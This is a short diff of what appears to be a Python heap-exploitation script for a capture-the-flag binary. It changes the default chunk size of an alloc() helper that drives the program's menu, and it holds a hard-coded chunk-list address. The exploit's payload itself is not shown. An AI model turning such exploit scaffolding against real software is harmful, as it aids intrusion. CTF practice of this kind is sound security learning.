@@ -122,7 +122,7 @@ p = process()
 
 CHUNKLIST = 0x6020c0
 
-def alloc(size=0x150, data='a'):
+def alloc(size=0x98, data='a'):
     p.sendlineafter('>> ', '1')
     p.sendlineafter('Size: ', str(size))
     p.sendlineafter('Data: ', data)
